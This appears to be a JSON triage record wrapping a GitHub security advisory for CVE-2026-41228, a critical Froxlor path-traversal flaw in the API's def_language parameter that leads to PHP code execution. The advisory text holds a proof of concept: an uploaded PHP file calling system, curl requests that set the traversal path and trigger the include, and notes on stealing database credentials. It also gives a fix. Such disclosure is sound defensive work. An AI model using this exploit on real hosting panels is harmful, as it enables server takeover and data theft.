@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41228\", \"cvss\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-98\", \"name\": \"Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')\"}], \"description\": \"## Summary\\n\\nThe Froxlor API endpoint `Customers.update` (and `Admins.update`) does not validate the `def_language` parameter against the list of available language files. An authenticated customer can set `def_language` to a path traversal payload (e.g., `../../../../../var/customers/webs/customer1/evil`), which is stored in the database. On subsequent requests, `Language::loadLanguage()` constructs a file path using this value and executes it via `require`, achieving arbitrary PHP code execution as the web server user.\\n\\n## Details\\n\\n**Root cause:** The API and web UI have inconsistent validation for the `def_language` parameter.\\n\\nThe **web UI** (`customer_index.php:261`, `admin_index.php:265`) correctly validates `def_language` against `Language::getLanguages()`, which scans the `lng/` directory for actual language files:\\n\\n```php\\n// customer_index.php:260-265\\n$def_language = Validate::validate(Request::post('def_language'), 'default language');\\nif (isset($languages[$def_language])) {\\n    Customers::getLocal($userinfo, [\\n        'id' => $userinfo['customerid'],\\n        'def_language' => $def_language\\n    ])->update();\\n```\\n\\nThe **API** (`Customers.php:1207`, `Admins.php:600`) only runs `Validate::validate()` with the default regex `/^[^\\\\r\\\\n\\\\t\\\\f\\\\0]*$/D`, which permits path traversal sequences:\\n\\n```php\\n// Customers.php:1167-1172 (customer branch)\\n} else {\\n    // allowed parameters\\n    $def_language = $this->getParam('def_language', true, $result['def_language']);\\n    ...\\n}\\n// Customers.php:1207 - validation (shared by admin and customer paths)\\n$def_language = Validate::validate($def_language, 'default language', '', '', [], true);\\n```\\n\\nThe tainted value is stored in the `panel_customers` (or `panel_admins`) table. On every subsequent request, it is loaded and used in two paths:\\n\\n**API path** (`ApiCommand.php:218-222`):\\n```php\\nprivate function initLang()\\n{\\n    Language::setLanguage(Settings::Get('panel.standardlanguage'));\\n    if ($this->getUserDetail('language') !== null && isset(Language::getLanguages()[$this->getUserDetail('language')])) {\\n        Language::setLanguage($this->getUserDetail('language'));\\n    } elseif ($this->getUserDetail('def_language') !== null) {\\n        Language::setLanguage($this->getUserDetail('def_language')); // No validation\\n    }\\n}\\n```\\n\\n**Web path** (`init.php:180-185`):\\n```php\\nif (CurrentUser::hasSession()) {\\n    if (!empty(CurrentUser::getField('language')) && isset(Language::getLanguages()[CurrentUser::getField('language')])) {\\n        Language::setLanguage(CurrentUser::getField('language'));\\n    } else {\\n        Language::setLanguage(CurrentUser::getField('def_language')); // No validation\\n    }\\n}\\n```\\n\\nThe `language` session field is `null` for API requests and empty on fresh web logins, so both paths fall through to the unvalidated `def_language`.\\n\\n**File inclusion** (`Language.php:89-98`):\\n```php\\nprivate static function loadLanguage($iso): array\\n{\\n    $languageFile = dirname(__DIR__, 2) . sprintf('/lng/%s.lng.php', $iso);\\n    if (!file_exists($languageFile)) {\\n        return [];\\n    }\\n    $lng = require $languageFile;  // Arbitrary PHP execution\\n```\\n\\nWith `$iso = '../../../../../var/customers/webs/customer1/evil'`, the path resolves to `/var/customers/webs/customer1/evil.lng.php`, escaping the `lng/` directory.\\n\\n## PoC\\n\\n**Step 1 — Upload malicious language file via FTP:**\\n\\nFroxlor customers have FTP access to their web directory by default (`api_allowed` defaults to `1` in the schema).\\n\\n```bash\\n# Create malicious .lng.php file\\necho '<?php system(\\\"id > /tmp/pwned\\\"); return [];' > evil.lng.php\\n\\n# Upload to customer web directory via FTP\\nftp panel.example.com\\n> put evil.lng.php\\n```\\n\\nThe file is now at `/var/customers/webs/<loginname>/evil.lng.php`.\\n\\n**Step 2 — Set traversal payload via API:**\\n\\n```bash\\ncurl -s -X POST https://panel.example.com/api \\\\\\n  -H 'Authorization: Basic <base64(apikey:apisecret)>' \\\\\\n  -d '{\\\"command\\\":\\\"Customers.update\\\",\\\"params\\\":{\\\"def_language\\\":\\\"../../../../../var/customers/webs/customer1/evil\\\"}}'\\n```\\n\\nThe traversal path is stored in the database. The `.lng.php` suffix is appended automatically by `Language::loadLanguage()`.\\n\\n**Step 3 — Trigger inclusion on next API call:**\\n\\n```bash\\ncurl -s -X POST https://panel.example.com/api \\\\\\n  -H 'Authorization: Basic <base64(apikey:apisecret)>' \\\\\\n  -d '{\\\"command\\\":\\\"Customers.get\\\"}'\\n```\\n\\n`ApiCommand::initLang()` loads `def_language` from the database and passes it to `Language::setLanguage()` → `loadLanguage()` → `require /var/customers/webs/customer1/evil.lng.php`.\\n\\n**Step 4 — Verify execution:**\\n\\n```bash\\ncat /tmp/pwned\\n# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n```\\n\\n## Impact\\n\\nAn authenticated customer can execute arbitrary PHP code as the web server user. This enables:\\n\\n- **Full server compromise:** Read `lib/userdata.inc.php` to obtain database credentials, then access all customer data, admin credentials, and server configuration.\\n- **Lateral movement:** Access other customers' databases, email, and files from the shared hosting environment.\\n- **Persistent backdoor:** Modify Froxlor source files or cron configurations to maintain access.\\n- **Data exfiltration:** Read all hosted databases and email content across the panel.\\n\\nThe attack is practical because Froxlor is a hosting panel where customers have FTP access by default, and API access is enabled by default (`api_allowed` = 1). The `.lng.php` suffix constraint is not a meaningful barrier since the attacker controls file creation in their web directory.\\n\\n## Recommended Fix\\n\\nValidate `def_language` against the actual language file list in the API endpoints, matching the web UI behavior:\\n\\n```php\\n// In Customers.php, replace line 1207:\\n// $def_language = Validate::validate($def_language, 'default language', '', '', [], true);\\n\\n// With:\\n$def_language = Validate::validate($def_language, 'default language', '', '', [], true);\\nif (!empty($def_language) && !isset(Language::getLanguages()[$def_language])) {\\n    $def_language = Settings::Get('panel.standardlanguage');\\n}\\n```\\n\\nApply the same fix in `Admins.php` at line 600.\\n\\nAdditionally, add a defensive check in `Language::loadLanguage()` to prevent path traversal:\\n\\n```php\\nprivate static function loadLanguage($iso): array\\n{\\n    // Reject path traversal attempts\\n    if ($iso !== basename($iso) || str_contains($iso, '..')) {\\n        return [];\\n    }\\n    $languageFile = dirname(__DIR__, 2) . sprintf('/lng/%s.lng.php', $iso);\\n    // ...\\n}\\n```\", \"epss\": {\"percentage\": 0.00524, \"percentile\": 0.40524}, \"ghsa_id\": \"GHSA-w59f-67xm-rxx7\", \"github_reviewed_at\": \"2026-04-16T01:02:12Z\", \"html_url\": \"https://github.com/advisories/GHSA-w59f-67xm-rxx7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w59f-67xm-rxx7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41228\"}], \"nvd_published_at\": \"2026-04-23T04:16:19Z\", \"published_at\": \"2026-04-16T01:02:12Z\", \"references\": [\"https://github.com/froxlor/froxlor/security/advisories/GHSA-w59f-67xm-rxx7\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41228\", \"https://github.com/froxlor/froxlor/commit/bc5e6dbaa90e6f3573129da640595e8c770e1d0c\", \"https://github.com/froxlor/froxlor/releases/tag/2.3.6\", \"https://github.com/advisories/GHSA-w59f-67xm-rxx7\"], \"repository_advisory_url\": \"https://api.github.com/repos/froxlor/froxlor/security-advisories/GHSA-w59f-67xm-rxx7\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/froxlor/froxlor\", \"summary\": \"Froxlor has Local File Inclusion via path traversal in API `def_language` parameter leads to Remote Code Execution\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T20:53:54Z\", \"url\": \"https://api.github.com/advisories/GHSA-w59f-67xm-rxx7\", \"vulnerabilities\": [{\"first_patched_version\": \"2.3.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"froxlor/froxlor\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.3.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w59f-67xm-rxx7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "froxlor/froxlor: <= 2.3.5"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-41228"
+    ],
+    "cvss_score": 9.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "froxlor/froxlor"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.672261Z",
+  "provenance": {
+    "content_sha256": "ad4c5febdf990967df70ab5e1d4106043fd7615827e6d9230124a2a4984449d5",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-16T01:02:12Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w59f-67xm-rxx7",
+  "status": "active",
+  "title": "Froxlor has Local File Inclusion via path traversal in API `def_language` parameter leads to Remote Code Execution",
+  "updated_at": "2026-04-24T20:53:54Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w59f-67xm-rxx7"
+}
